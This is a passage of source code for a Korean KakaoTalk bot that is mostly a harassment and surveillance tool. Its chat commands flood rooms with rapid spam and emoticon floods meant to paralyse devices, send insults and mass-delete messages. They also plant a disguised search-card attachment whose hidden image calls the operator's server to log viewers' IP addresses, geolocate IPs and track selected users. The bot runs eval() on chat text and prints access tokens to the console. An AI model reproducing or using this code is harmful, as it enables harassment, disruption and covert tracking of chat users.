                            for (var i = 0; i < userIdList.length; i++) {
                                mustDetect.push(roomId + ":" + userIdList[i] + "");
                            };
                            channel.sendChat("모든 유저를 감지하기 시작합니다!");
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    };
                };

                if (data.text.startsWith(prefix + "감지 ")) {
                    if (adminList.includes(id + '')) {
                        try {
                            var _Mention = data.mentions[0].user_id;
                            var detectChar = roomId + ":" + _Mention + "";
                            if (mustDetect.includes(detectChar)) {
                                channel.sendChat("해당 유저는 이미 감지중입니다...");
                            } else {
                                mustDetect.push(detectChar);
                                var msg = "해당 유저가 감지목록에 추가됐습니다!\n현재 감지 목록 (방Id:사용자Id):";
                                for (var getValueFor = 0; getValueFor < mustDetect.length; getValueFor++) {
                                    msg += "\n[" + (getValueFor + 1) + "/" + mustDetect.length + "]" + mustDetect[getValueFor];
                                };
                                channel.sendChat(msg);
                            };
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    };
                };

                if (data.text == prefix + "감지목록") {
                    if (adminList.includes(id + '')) {
                        try {
                            if (mustDetect.length == 0) {
                                channel.sendChat("감지중인 유저가 없습니다!");
                                return;
                            };
                            var msg = "감지 목록 (방Id:사용자Id):";
                            for (var getValueFor = 0; getValueFor < mustDetect.length; getValueFor++) {
                                msg += "\n[" + (getValueFor + 1) + "/" + mustDetect.length + "]" + mustDetect[getValueFor];
                            };
                            channel.sendChat(msg);
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    };
                };

                if (data.text == prefix + "욕") {
                    if (adminList.includes(id + '')) {
                        var random = Math.floor(Math.random() * mentArray.length);
                        channel.sendChat(mentArray[random]);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "방폭중지") {
                    if (adminList.includes(id + '')) {
                        if (terrorSpam) {
                            clearInterval(terrorInterval);
                            terrorInterval = null;
                            terrorSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 폰튕") {
                    if (adminList.includes(id + '')) {
                        if (phErrSpam) {
                            clearInterval(phErrInterval);
                            phErrInterval = null;
                            phErrSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 컴튕") {
                    if (adminList.includes(id + '')) {
                        if (comErrSpam) {
                            clearInterval(comErrInterval);
                            comErrInterval = null;
                            comErrSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 노짱") {
                    if (adminList.includes(id + '')) {
                        if (runningSpamNo) {
                            clearInterval(noInterval);
                            noInterval = null;
                            runningSpamNo = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 랜덤") {
                    if (adminList.includes(id + '')) {
                        if (runningSpam) {
                            clearInterval(spamInterval);
                            spamInterval = null;
                            runningSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 욕") {
                    if (adminList.includes(id + '')) {
                        if (runningMent) {
                            clearInterval(mentInterval);
                            mentInterval = null;
                            runningMent = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 멘션") {
                    if (adminList.includes(id + '')) {
                        if (mentionSpam) {
                            clearInterval(mentionInterval);
                            mentionInterval = null;
                            mentionSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "도배 문자")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "도배 문자") {
                            channel.sendChat("도배할 문자를 입력해주세요!");
                        } else {
                            if (!runningSpamString) {
                                var _message = data.text.replace(prefix + "도배 문자 ", "");
                                var i = 0;
                                runningSpamString = true;
                                stringInterval = setInterval(() => {
                                    channel.sendChat(_message);
                                    i++;
                                }, 90);
                            } else {
                                channel.sendChat("이미 도배를 하는중입니다!");
                            };
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 문자") {
                    if (adminList.includes(id + '')) {
                        if (runningSpamString) {
                            clearInterval(stringInterval);
                            stringInterval = null;
                            runningSpamString = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 마비") {
                    if (adminList.includes(id + '')) {
                        if (!runningSpamStop) {
                            runningSpamStop = true;
                            stopInterval = setInterval(() => {
                                channel.sendChat(
                                    new $ChatBuilder().text(" ").append(new $AttachmentContent({
                                        "name": "(이모티콘)",
                                        "url": "4415897.emot_001.png",
                                        "type": "animated-emoticon/digital-item",
                                        "path2": "2212560.emot_033.png",
                                        "scon": "6002007.file_008.scon",
                                        "s": 0
                                    })).build(22)
                                );
                            }, 90);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배중지 마비") {
                    if (adminList.includes(id + '')) {
                        if (runningSpamStop) {
                            clearInterval(stopInterval);
                            stopInterval = null;
                            runningSpamStop = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "콘솔로그") {
                    if (adminList.includes(id + '')) {
                        if (logMessage) {
                            logMessage = false;
                            channel.sendChat("메세지 로깅을 중단하였습니다.");
                        } else {
                            logMessage = true;
                            channel.sendChat("메세지 로깅을 시작합니다.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "프사")) {
                    if (adminList.includes(id + '')) {
                        if (data.mentions[0]) {
                            try {
                                var mention = data.mentions[0];
                                var url = channel.getUserInfo({ userId: mention.user_id }).originalProfileURL || "이미지 확인 불가";
                                http.get(url.replace("https", "http"), (res) => {
                                    var file = fs.createWriteStream(`${id}.png`);
                                    res.pipe(file);
                                    file.on('finish', () => {
                                        async function msg() {
                                            await file.close();
                                            await delay(100);
                                            await channel.sendMedia($KnownChatType.PHOTO, {
                                                name: `${id}.png`,
                                                data: fs.readFileSync(`${id}.png`),
                                                width: 500,
                                                height: 500,
                                                ext: 'jpg'
                                            });
                                            await fs.unlinkSync(`${id}.png`);
                                        };
                                        msg();
                                    });
                                }).on("error", (err) => {
                                    console.log("Error: ", err.message);
                                });
                            } catch (e) {
                                channel.sendChat("Error:\n" + e);
                            };
                        } else {
                            channel.sendChat("프사를 가져올 대상을 멘션해주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "삭제") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            try {
                                channel.deleteChat({ 'logId': data._chat.attachment.src_logId });
                            } catch (e) {
                                channel.sendChat(e);
                            };
                        } else {
                            channel.sendChat("답장형태로 채팅을 쳐주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "일괄삭제") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == 26) {
                            var reply = data.attachment();
                            var logId = reply.src_logId;
                            channel.deleteChat({ 'logId': data._chat.attachment.src_logId });
                            channel.getChatListFrom(logId).then(r => {
                                if (r.result) {
                                    r.result.forEach((v, i) => {
                                        try {
                                            channel.deleteChat({ 'logId': v.logId });
                                        } catch (error) {
                                            console.log(error)
                                        };
                                    });
                                };
                            });
                        } else {
                            channel.sendChat("답장 형태로 적어주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + '밑메') {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == 26) {
                            try {
                                var reply = data.attachment();
                                var logId = reply.src_logId;
                                channel.getChatListFrom(logId).then(r => {
                                    async function msg() {
                                        var chlog = '';
                                        chlog +=
                                            '---------------------------------------' +
                                            '\n\n' +
                                            '보낸사람 아이디: ' +
                                            r.result[0].sender.userId +
                                            '\n\n' +
                                            '방 아이디: ' +
                                            channel.info.channelId +
                                            '\n\n' +
                                            '보낸 시간: ' +
                                            new Date(r.result[0].sendAt) +
                                            '\n\n' +
                                            '메세지 타입: ' +
                                            r.result[0].type +
                                            '\n\n' +
                                            '어태치: ' +
                                            JSON.stringify(r.result[0].attachment, null, 2) +
                                            '\n\n' +
                                            '메세지: ' +
                                            r.result[0].text +
                                            '\n\n' +
                                            '메세지 RAW: ' +
                                            JSON.stringify(r.result[0], null, 2) +
                                            '\n\n---------------------------------------\n';
                                        sendLong(channel, "[밑메]", chlog);
                                    };
                                    msg();
                                });
                            } catch (e) {
                                channel.sendChat(e)
                            };
                        } else {
                            channel.sendChat("메세지를 답장 형태로 적어주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "evalue") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            if ($DefChatLog[data._chat.attachment.src_logId]) {
                                var evalMSG = JSON.parse($DefChatLog[data._chat.attachment.src_logId]);
                                console.log(evalMSG);
                                sendLong(channel, "[eval value]", `eval channel.sendChat(new $ChatBuilder().text("${evalMSG.text}").append(new $AttachmentContent(${JSON.stringify(evalMSG.attachment, null, 2)})).build(${evalMSG.type}));`);
                            } else {
                                channel.sendChat("해당 명령어를 쓰려면 메세지 로깅이 되어야합니다!");
                            };
                        } else {
                            channel.sendChat("답장형태로 채팅을 쳐주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "메세지로그") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            if ($DefChatLog[data._chat.attachment.src_logId]) {
                                channel.getChatListFrom(data._chat.attachment.src_logId).then(r => {
                                    sendLong(channel, "[메세지로그]", "<<<<<<<<<<<<메세지로그>>>>>>>>>>>>" +
                                        "\u200b".repeat(500) +
                                        "\n\n" +
                                        "\n----------------------------------------" +
                                        "\n방 아이디: " + roomId +
                                        "\n\n보낸사람 아이디: " + data._chat.attachment.src_userId +
                                        "\n\n보낸사람 아이디 [LOW]: " + data._chat.attachment.src_userId +
                                        "\n\n로그 아이디: " + data._chat.attachment.src_logId +
                                        "\n\n로그 아이디 [LOW]: " + data._chat.attachment.src_logId +
                                        "\n\n링크 아이디: " + data._chat.attachment.src_linkId +
                                        "\n\n텍스트: " + data._chat.attachment.src_message +
                                        "\n\n메세지 타입: " + data._chat.attachment.src_type +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n어태치:\n" + JSON.stringify(data._chat.attachment, null, 2) +
                                        "\n-----------------------" +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n메세지 RAW:\n" + JSON.stringify(JSON.parse($DefChatLog[data._chat.attachment.src_logId]), null, 2) +
                                        "\n-----------------------" +
                                        "\n----------------------------------------" +
                                        "\n" +
                                        "\n----------------------------------------" +
                                        "\n방 아이디: " + roomId +
                                        "\n\n보낸시간: " + new Date(r.result[0].sendAt) +
                                        "\n\n보낸사람 아이디: " + r.result[0].sender.userId +
                                        "\n\n보낸사람 아이디 [LOW]: " + r.result[0].sender.userId +
                                        "\n\n텍스트: " + r.result[0].text +
                                        "\n\n메세지 타입: " + r.result[0].type +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n어태치:\n" + JSON.stringify(r.result[0].attachment, null, 2) +
                                        "\n-----------------------" +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n메세지 RAW:\n" + JSON.stringify(r.result[0], null, 2) +
                                        "\n-----------------------" +
                                        "\n----------------------------------------" +
                                        "");
                                });
                            } else {
                                channel.getChatListFrom(data._chat.attachment.src_logId).then(r => {
                                    sendLong(channel, "[메세지로그]", "<<<<<<<<<<<<메세지로그>>>>>>>>>>>>" +
                                        "\u200b".repeat(500) +
                                        "\n\n" +
                                        "\n----------------------------------------" +
                                        "\n방 아이디: " + roomId +
                                        "\n\n보낸사람 아이디: " + data._chat.attachment.src_userId +
                                        "\n\n보낸사람 아이디 [LOW]: " + data._chat.attachment.src_userId +
                                        "\n\n로그 아이디: " + data._chat.attachment.src_logId +
                                        "\n\n로그 아이디 [LOW]: " + data._chat.attachment.src_logId +
                                        "\n\n링크 아이디: " + data._chat.attachment.src_linkId +
                                        "\n\n텍스트: " + data._chat.attachment.src_message +
                                        "\n\n메세지 타입: " + data._chat.attachment.src_type +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n어태치:\n" + JSON.stringify(data._chat.attachment, null, 2) +
                                        "\n-----------------------" +
                                        "\n----------------------------------------" +
                                        "\n" +
                                        "\n----------------------------------------" +
                                        "\n방 아이디: " + roomId +
                                        "\n\n보낸시간: " + new Date(r.result[0].sendAt) +
                                        "\n\n보낸사람 아이디: " + r.result[0].sender.userId +
                                        "\n\n보낸사람 아이디 [LOW]: " + r.result[0].sender.userId +
                                        "\n\n로그 아이디: " + r.result[0].logId +
                                        "\n\n로그 아이디 [LOW]: " + r.result[0].logId +
                                        "\n\n텍스트: " + r.result[0].text +
                                        "\n\n메세지 타입: " + r.result[0].type +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n어태치:\n" + JSON.stringify(r.result[0].attachment, null, 2) +
                                        "\n-----------------------" +
                                        "\n" +
                                        "\n-----------------------" +
                                        "\n메세지 RAW:\n" + JSON.stringify(r.result[0], null, 2) +
                                        "\n-----------------------" +
                                        "\n----------------------------------------" +
                                        "");
                                });
                            };
                        } else {
                            channel.sendChat("답장형태로 채팅을 쳐주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "현재로그") {
                    channel.sendChat(JSON.stringify(data.chat));
                };

                if (data.text == prefix + "아이피 필터링끄기") {
                    if (adminList.includes(id + '')) {
                        ipLog_filter = false;
                        channel.sendChat("본인아이피 필터링 해제");
                    };
                };

                if (data.text == prefix + "아이피 필터링켜기") {
                    if (adminList.includes(id + '')) {
                        ipLog_filter = true;
                        channel.sendChat("본인아이피 필터링 시작");
                    };
                };

                if (data.text.startsWith(prefix + "위치정보")) {
                    if (data.text.startsWith(prefix + "위치정보 ")) {
                        try {
                            var ip = data.text.replace(prefix + "위치정보 ", "");
                            ipinfo(ip, (err, inf) => {
                                async function msg() {
                                    var info = err || inf;
                                    var ip = info.ip;
                                    var city = info.city;
                                    var region = info.region;
                                    var country = info.country;
                                    var loc = info.loc;
                                    var org = info.org;
                                    var postal = info.postal;
                                    var timezone = info.timezone;
                                    var myMsg = await channel.sendChat(ip + "의 위치정보" + "\u200b".repeat(500) + `\n\nIP: ${ip}\nCITY: ${city}\nREGION: ${region}\nCOUNTRY: ${country}\nLOCATION: ${loc}\nORG: ${org}\nPOSTAL: ${postal}\nTIMEZONE: ${timezone}`);
                                    await delay(110);
                                    await channel.sendChat(
                                        new $ChatBuilder().text("네퓨봇").append(new $ReplyContent(myMsg.result)).append(new $AttachmentContent({
                                            lat: loc.split(",")[0],
                                            lng: loc.split(",")[1],
                                            a: "Location of " + ip + "!",
                                        })).build(16)
                                    );
                                };
                                msg();
                            });
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("아이피를 함께 적어주세요!");
                    };
                };

                if (data.text == prefix + "아이피 시작") {
                    if (adminList.includes(id + '')) {
                        try {
                            ipLog_admin = getDnsIp.address();
                            ipLog_channel = channel;
                            ipLog_loggedIps = [];
                            ipLog_local = "";
                            ipLog_usingServer = "Using";
                            http.get({ 'host': 'api.ipify.org', 'port': 80, 'path': '/' }, function (res) {
                                res.on("data", function (chunk) {
                                    ipLog_local = chunk;
                                    ipLog_adress = "http://" + chunk + ":" + ipPort + "/"
                                    // channel.sendChat(
                                    //     new $ChatBuilder().text("샵검색: #おはよう!").append(new $AttachmentContent({
                                    //         "L": "https://pbs.twimg.com/profile_images/692052941885157376/ElvMVmCx_400x400.png",
                                    //         "Q": "おはよう!",
                                    //         "V": "simple",
                                    //         "RH": {
                                    //             "HI": {
                                    //                 "W": 256,
                                    //                 "H": 256,
                                    //                 "L": "https://pbs.twimg.com/profile_images/692052941885157376/ElvMVmCx_400x400.png",
                                    //                 "I": "http://" + chunk + ":" + ipPort + "/"
                                    //             };
                                    //         },
                                    //         "R": [{
                                    //             "L": "https://pbs.twimg.com/profile_images/692052941885157376/ElvMVmCx_400x400.png",
                                    //             "T": "섹시한 아이피 로거",
                                    //             "D": "지훈이가 만든 최고급 사이트입니다."
                                    //         }],
                                    //     })).build(23)
                                    // );
                                    channel.sendChat(
                                        new $ChatBuilder().append(new $AttachmentContent({
                                            "L": "https://nefew.kr/discord",
                                            "Q": "おはよう!",
                                            "V": "image",
                                            "R": [
                                                {
                                                    "D": "おはよう!",
                                                    "L": "https://nefew.kr/discord",
                                                    "I": "http://" + chunk + ":" + ipPort + "/",
                                                    "W": 10,
                                                    "H": 10
                                                }
                                            ]
                                        })).build(23)
                                    );
                                });
                            }).on('error', function (e) {
                                channel.sendChat("오류가 발생했습니다.\n" + e.message);
                            });
                        } catch (e) {
                            channel.sendChat(e + "");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "아이피 종료" || data.text == prefix + "아이피 중지") {
                    if (adminList.includes(id + '')) {
                        if (ipLog_usingServer != "None") {
                            try {
                                channel.sendChat("아이피 로깅을 종료합니다.");
                                ipLog_usingServer = "None";
                            } catch (e) {
                                channel.sendChat(e + "");
                            };
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "채팅타입") {
                    channel.sendChat("채팅 타입 목록" + "\u200b".repeat(1000) +
                        "\nFEED : 0" +
                        "\nTEXT : 1" +
                        "\nPHOTO : 2" +
                        "\nVIDEO : 3" +
                        "\nCONTACT : 4" +
                        "\nAUDIO : 5" +
                        "\nDITEMEMOTICON : 6" +
                        "\nDITEMGIFT : 7" +
                        "\nDITEMIMG : 8" +
                        "\nKAKAOLINKV1 : 9" +
                        "\nAVATAR : 11" +
                        "\nSTICKER : 12" +
                        "\nSCHEDULE : 13" +
                        "\nVOTE : 14" +
                        "\nLOTTERY : 15" +
                        "\nMAP : 16" +
                        "\nPROFILE : 17" +
                        "\nFILE : 18" +
                        "\nSTICKERANI : 20" +
                        "\nNUDGE : 21" +
                        "\nACTIONCON : 22" +
                        "\nSEARCH : 23" +
                        "\nPOST : 24" +
                        "\nSTICKERGIF : 25" +
                        "\nREPLY : 26" +
                        "\nMULTIPHOTO : 27" +
                        "\nVOIP : 51" +
                        "\nLIVETALK : 52" +
                        "\nCUSTOM : 71" +
                        "\nALIM : 72" +
                        "\nPLUSFRIEND : 81" +
                        "\nPLUSEVENT : 82" +
                        "\nPLUSFRIENDVIRAL : 83" +
                        "\nOPEN_SCHEDULE : 96" +
                        "\nOPEN_VOTE : 97" +
                        "\nOPEN_POST : 98" +
                        "");
                };

                if (data.text == prefix + "임티번호") {
                    channel.sendChat("이모티콘 코드 목록" + "\u200b".repeat(1000) +
                        "\n" +
                        "\n" +
                        "\n4412207 안녕 니니즈 (무료) (움직임)" +
                        "\n2212560 카카오프렌즈 클래식 (무료) (안움직임)" +
                        "\n4412255 안녕! 나는 익명이고 언제나 조아해 (유료) (움직임)" +
                        "\n9000123 안녕! 나는 익명이고 엄청 좋아해 (유료) (안움직임)" +
                        "\n4412008 안녕! 나는 익명이고 오늘도 좋아해 (유료) (안움직임)" +
                        "\n4412234 키키코코모모2 (유료) (움직임)" +
                        "\n4412355 화가 많은 엄지형 (유료) (움직임)" +
                        "\n4412444 올망졸망 글자티콘 (유료) (움직임)" +
                        "\n4413442 녹아버린 마시멜로 멜냥이 (유료) (움직임)" +
                        "\n4413442 쿨시크 액션 햄저스 (유료) (움직임)" +
                        "\n4412442 그냥그런토끼 Ver.3 (유료) (움직임)" +
                        "\n4412550 하위! 파란댕댕이! (유료) (움직임)" +
                        "\n4412300 오쯔네코 수고했어 오늘도 (유료) (움직임)" +
                        "\n4414206 10살 펭귄 펭수의 일상 2탄 (유료) (움직임)" +
                        "\n4415442 망그러진 곰 (유료) (움직임)" +
                        "\n4411439 프렌즈 홀리데이 (유료) (움직임)" +
                        "\n4412045 격려 잘하는 잘곰이 (유료) (움직임)" +
                        "\n9000164 튀어나오는 목아지콘 (유료) (움직임)" +
                        "\n4420117 쥐방울은 사랑스렁 (유료) (움직임)" +
                        "\n2221163 뽀시래기 복동이의 슬기로운 주식생활 (유료) (안움직임)" +
                        "\n4416520 돗개는 오늘도 왈왈2 (유료) (움직임)" +
                        "\n4416471 총총! (유료) (움직임)" +
                        "\n4403128 유쾌한 동네놈들 (유료) (움직임)" +
                        "\n4415740 더 급하개 더 바쁘개 (유료) (움직임)" +
                        "\n4416484 빵덕후 고양이 2 (유료) (움직임)" +
                        "\n4414429 봄이는 뽀잉뽀잉 (유료) (움직임)" +
                        "\n4411015 우쭈쭈쭈모찌찌찌 (유료) (움직임)" +
                        "\n2214743 관심좀콘 (유료) (안움직임)" +
                        "\n4415752 촐랑촐랑 깐족제비 (유료) (움직임)" +
                        "\n4414420 인성터진 파란친구 (유료) (움직임)" +
                        "\n2221289 병주고 약주는 기복이 3 (유료) (안움직임)" +
                        "\n4416423 한자티콘 (유료) (움직임)" +
                        "\n4416283 쿨데레 그녀 (유료) (움직임)" +
                        "\n2214616 게임하는 하루 (유료) (안움직임)" +
                        "\n2214958 매일매일이 숙제야.. (유료) (안움직임)" +
                        "\n2212330 감정이 풍부한 아이 (유료) (안움직임)" +
                        "\n2212383 부질없는 인간의 공명하는 세계 (유료) (안움직임)" +
                        "\n4415985 케장콘13 (유료) (움직임)" +
                        "\n4401161 또 저예요 영철이에요 (유료) (움직임)" +
                        "\n4401166 춥지 않소 김춘배요 (유료) (움직임)" +
                        "\n4401141 또 반갑소 김춘배요 (유료) (움직임)" +
                        "\n4401146 다시 반갑소 김춘배요 (유료) (움직임)" +
                        "\n2214634 잔망 루피 2 (유료) (안움직임)" +
                        "\n2214471 잔망 루피 (유료) (안움직임)" +
                        "\n9000109 화려하게 나타난 전광티콘 (유료) (움직임)" +
                        "\n4414147 등장!! 단톡방 용사님 (유료) (움직임)" +
                        "\n4414153 파자마 그녀 4 (유료) (움직임)" +
                        "\n2214504 파자마 친구 2 (유료) (안움직임)" +
                        "\n4414875 나도 맹수다 (유료) (움직임)" +
                        "\n4401154 키워, 키우라고 금수친구들 (유료) (움직임)" +
                        "\n4414153 파자마 그녀 4 (유료) (움직임)" +
                        "\n4412197 뽀잉뽀잉 뚠때니 펭귄 (유료) (움직임)" +
                        "\n4401072 연애혁명 (유료) (움직임)" +
                        "\n4413107 약 올릴 떄 행복한 관종 재일이 (유료) (움직임)" +
                        "\n4414342 애니멀 특전대 깐족깐족 찐깐족! (유료) (움직임)" +
                        "\n4412660 귀여운 히어로, 어벤져스 (유료) (움직임)" +
                        "\n4412465 바른생활 극사실 주의 (유료) (움직임)");
                };

                if (data.text.startsWith("eval ")) {
                    if (adminList.includes(id + '')) {
                        async function msg() {
                            try {
                                eval(data.text.substr(5));
                            } catch (e) {
                                channel.sendChat(e);
                            };
                        };
                        msg();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == "evalk") {
                    if (adminList.includes(id + '')) {
                        async function msg() {
                            try {
                                eval(data.text.substr(5));
                            } catch (e) {
                                channel.sendChat(e);
                            };
                        };
                        msg();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };
            };
        });

        CLIENT.on('disconnected', (reason) => {
            console.log('\n*********************************접속종료*********************************',
                '\n   서버 접속이 종료되었습니다.',
                '\n   사유: ' + reason,
                '\n*************************************************************************');
        });

        CLIENT.on('error', (err) => {
            console.log('\n*********************************접속오류*********************************',
                '\n   서버 접속에 오류가 생겼습니다.',
                '\n   에러내용: ' + err,
                '\n*************************************************************************');
        });

        CLIENT.on('switch_server', () => {
            console.log('\n*********************************접속변경*********************************',
                '\n   서버 변경 요청이 감지되었습니다.',
                '\n*************************************************************************');
        });

        CLIENT.on("push_packet", (m, d) => {
            //if(m == "MSG"){ channel.sendChat("d");};
            console.log('-----------PUSH PACKET-----------');
            console.log(m);
            console.log(d);
            console.log('----------------------------------');
        });

        CLIENT.on('meta_change', (channel, type, newMeta) => {
            if (type + '' == '3') {
                if ($TitleSpamList[channel.channelId] != false) {
                    channel.setTitleMeta($TitleSpamList[channel.channelId]);
                };
            };
            if (type + '' == '4') {
                if ($ProfileSpamList[channel.channelId] != false) {
                    channel.setProfileMeta({ imageUrl: $ProfileSpamList[channel.channelId], fullImageUrl: $ProfileSpamList[channel.channelId] });
                };
            };
            console.log('\n-[메타변경]------------------------------------------------',
                '\n채널아이디: ' + channel.channelId,
                '\n타입: ' + type,
                '\n메타: ' + newMeta.content,
                '\n전송자: ' + newMeta.authorId,
                '\n-----------------------------------------------------------');
        });

        CLIENT.on('chat_event', (channel, author, type, count, chat) => {
            //channel.sendChat(`${author.nickname} touched hearts ${count} times`);
        });

        async function login() {
            await importAdmin();
            var api = await $AuthApiClient.create(ACC_NAME, ACC_UUID);
            var form = {
                email: ACC_EMAIL,
                password: ACC_PASSWORD,
                forced: true
            };
            await api.createAuthHeader(form);
            var loginRes = await api.login(form);
            if (!loginRes.success) {
                if (loginRes.status == -100) {
                    loginRes = null;
                    console.log("\n   >> 인증코드 요청중...");
                    const newForm = {
                        email: ACC_EMAIL,
                        password: ACC_PASSWORD
                    };
                    const passcodeRes = await api.requestPasscode(newForm);
                    if (!passcodeRes.success) {
                        console.log("   >> 인증코드 요청에 실패했습니다! 에러코드: " + passcodeRes.status);
                    } else {
                        let rl = readline.createInterface({
                            input: process.stdin,
                            output: process.stdout
                        });
                        let passcode = await new Promise(resolve => rl.question("   >> 인증코드: ", resolve)); //원본코드 new 앞에 yield
                        rl.close();
                        const registerRes = await api.registerDevice(newForm, passcode, true);
                        if (!registerRes.success) {
                            console.log("   >> 디바이스 등록에 실패했습니다. 에러코드: " + registerRes.status);
                            return;
                        } else {
                            console.log("   >> 디바이스 '" + ACC_UUID + "' 등록에 성공했습니다.");
                            loginRes = await api.login(form);
                            if (!loginRes.success) {
                                console.log("   >> 로그인에 실패했습니다. 에러코드: " + loginRes.status + "\n   >> 프로그램이 종료됩니다.");
                                return;
                            } else {
                                console.log("\n   >> 로그인 성공!");
                            };
                        };
                    };
                } else {
                    console.log("   >> 알수없는 오류로 인해 로그인에 실패했습니다. 오류내용(코드): " + loginRes.status)
                    return;
                };
            };
            gggg_XVCKEY = await api.calculateXVCKey(ACC_UUID, 'win32', ACC_EMAIL);
            gggg_TOKEN = loginRes.result.accessToken;
            gggg_R_TOKEN = loginRes.result.refreshToken;
            gggg_ID = loginRes.result.accountId;
            gggg_P_ID = loginRes.result.userId;
            gggg_L_RES = loginRes.result;
            //console.log(loginRes.result);
            var res = await CLIENT.login(loginRes.result);
            if (res.success) {
                console.log('\n*********************************APP 정보*********************************',
                    '\n   NODE KAKAO VERSION: ' + kakaoVer,
                    '\n   CLIENT VERSION: ' + ver,
                    '\n   LAST UPDATE: ' + lastUpdate,
                    '\n   ACCESS TOKEN: ' + loginRes.result.accessToken,
                    '\n   REFRESH TOKEN: ' + loginRes.result.refreshToken,
                    '\n   ID: ' + loginRes.result.accountId,
                    '\n   USER ID: ' + loginRes.result.userId,
                    '\n   DEVICE UUID: ' + loginRes.result.deviceUUID,
                    '\n   DISPLAY ID: ' + loginRes.result.displayAccountId,
                    '\n   AUTOLOGIN ID: ' + loginRes.result.autoLoginAccountId,
                    '\n   DEVICE AGENT NAME: ' + loginRes.result.mainDeviceAgentName,
                    '\n   DEVICE APP VERSION: ' + loginRes.result.mainDeviceAppVersion,
                    '\n   SERVER TIME: ' + loginRes.result.serverTime,
                    '\n   COUNTRY ISO: ' + loginRes.result.countryIso,
                    '\n   COUNTRY CODE: ' + loginRes.result.countryCode,
                    '\n   XVC KEY: ' + gggg_XVCKEY,
